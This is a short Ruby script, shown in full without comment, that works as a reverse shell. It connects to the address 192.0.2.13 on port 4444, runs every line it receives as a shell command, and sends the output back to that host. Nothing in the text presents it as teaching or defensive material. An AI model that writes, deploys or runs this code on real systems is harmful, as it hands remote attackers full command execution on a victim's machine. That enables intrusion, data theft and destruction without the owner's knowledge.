require 'socket'
require 'open3'
sock = TCPSocket.new('192.0.2.13', 4444)
while command = sock.gets
  Open3.popen2e("#{command}") do |input, output, wait|
    sock.write(output.read)
  end
end
